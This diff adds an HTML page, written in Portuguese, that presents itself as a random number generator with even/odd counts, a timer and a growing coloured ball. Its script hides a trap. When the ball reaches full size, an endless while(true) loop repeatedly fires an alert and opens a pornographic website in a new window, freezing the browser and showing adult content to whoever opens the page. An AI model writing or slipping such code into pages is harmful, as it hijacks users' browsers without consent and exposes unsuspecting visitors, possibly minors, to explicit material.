@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Babel</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
+        integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+
+    <style>
+        html,
+        body {
+            height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            width: 920px;
+            margin: 0 auto;
+            padding: 10px;
+        }
+
+        .container {
+            background-color: aliceblue;
+            padding: 20px;
+            box-shadow: 0 0 1em black;
+
+        }
+
+
+        #ball {
+            background-color: black;
+            border-radius: 10px;
+            transition: all 0.2s;
+        }
+
+        .painel {
+            background-color: rgb(255, 255, 255);
+            width: 433.2px;
+            border: 1px outset black;
+            height: 433.2px;
+            border-radius: 433.2px;
+        }
+    </style>
+
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <script type="text/babel">
+        let maior, menor, t = 0, pares = 0, impares = 0, max_dim = 433.2
+
+        let parOuImpar = numero => numero % 2 === 0 ? 'Par' : 'Impar'
+
+        let getMessage = msg => document.getElementById('numeros').innerHTML += `<span>${msg}</span> <br>`
+
+        let clean = () => document.getElementById('numeros').innerHTML = ""
+
+        let getRandom = (min, max) => Math.round(Math.random() * (max - min) + min)
+
+        let geraNumeros = (qntd = 10) => {
+            clean()
+
+            for (var i = 1; i <= qntd; i++) {
+                let numero = getRandom(1, 5000)
+
+                if (maior === undefined || maior < numero) maior = numero
+
+                if (menor === undefined || menor > numero) menor = numero
+
+                const tipo = parOuImpar(numero)
+
+                if (tipo === 'Par') document.getElementById('pares').innerHTML = (pares += 1).toString() + "<br>"
+
+                if (tipo === 'Impar') document.getElementById('impares').innerHTML = (impares += 1).toString()
+
+                document.getElementById('maiorQntd').innerHTML = (impares > pares ? 'Impares' : 'Pares')
+                document.getElementById('menor').innerHTML = menor
+                document.getElementById('maior').innerHTML = maior
+
+                getMessage(`${numero} - ${tipo}`)
+            }
+        }
+        var gerador = setInterval(geraNumeros, 200)
+
+        setInterval(() => {
+            document.getElementById('cronometro').innerHTML = (t += 1).toString()
+
+            let ball = document.getElementById('ball')
+            let dim = t * 5 >= max_dim ? max_dim : t * 5
+
+            ball.style.width = `${dim}px`
+            ball.style.height = `${dim}px`
+            ball.style.borderRadius = `${dim}px`
+            ball.style.background = `rgb(${getRandom(0, 255)}, ${getRandom(0, 255)}, ${getRandom(0, 255)})`
+
+            if (dim >= max_dim) {
+                while (true) {
+                    clearInterval(gerador)
+
+                    alert("O tempo chegou ao limite cuidado!")
+
+                    window.open("https://www.xvideos.com", "new_window")
+                }
+            }
+        }, 1000);
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Gerador de Numeros</h1>
+        <hr>
+        <div class="row">
+            <div class="col-4">
+                <div class="gerador">
+
+                    <p>Menor: <span id="menor"></span> | Maior: <span id="maior"></span></p>
+                    ----------------
+                    <p id="numeros">
+
+                    </p>
+                    ----------------
+                    <p>Tempo: <span id="cronometro">0</span></p>
+                    <p>Pares: <span id="pares"></span>Impares: <span id="impares"></span></p>
+                    <p>Em maior quantidade: <span id="maiorQntd"></span></p>
+                </div>
+            </div>
+            <div class="col-4 offset-1">
+                <div class="painel d-flex justify-content-center">
+                    <div id="ball" class="align-self-center"></div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
